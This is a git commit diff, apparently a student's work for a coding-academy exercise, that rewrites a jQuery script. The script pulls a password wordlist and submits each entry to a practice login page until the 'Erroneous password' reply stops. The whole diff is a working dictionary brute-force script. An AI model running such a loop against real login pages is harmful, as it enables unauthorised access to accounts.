bc225a7897f7449de16e9b59529c2b9e1f55d1ea
Mopi <solene.huault@gmail.com>
2016-08-13 21:46:18 +0200

    method 'get' + sale façon d'arrêter for

--- js/script.js
+++ js/script.js
@@ -1,24 +1,26 @@
 var psw = {}
 $.ajax({
-	url: "http://docusland.fr/code-academie/js_bruteforce/data/dico.txt"
-	, complete: function (result) {
-		psw = result.responseText.split("\n");
-		/*$("div").html(result);*/
+	async: false
+	, url: "http://docusland.fr/code-academie/js_bruteforce/data/dico.txt"
+	, success: function (result) {
+		psw = result.split("\n");
 	}
-});
+}).done(function() {
 
-
-$(document).ajaxComplete(function () {
-	for (var i = 0; i < psw.length; i++) {
-		$.ajax({
-			url: "http://docusland.fr/code-academie/js_bruteforce/index.php"
-			, password: psw[i]
-			, complete: function (answer) {
-				var wrong = "<div style='color:red; font-size:18px'>Erroneous password</div>";
-				if (answer.responseText != wrong) {
-					alert(psw[i]);
-				}
+//12650
+var position = psw.length;
+for (var i = 0; i < position ; i++) {
+	$.ajax({
+		type: "GET"
+		, async: false
+		, url: "http://docusland.fr/code-academie/js_bruteforce/index.php"
+		, data: {password: psw[i]}
+		, success: function (answer) {
+			$("p").html("password tested: " + psw[i]);
+			$("div").html(answer);
+			if (!answer.match("Erroneous password")) {
+				position = i;
 			}
-		});
-	}
-});
+		}
+	});
+}})
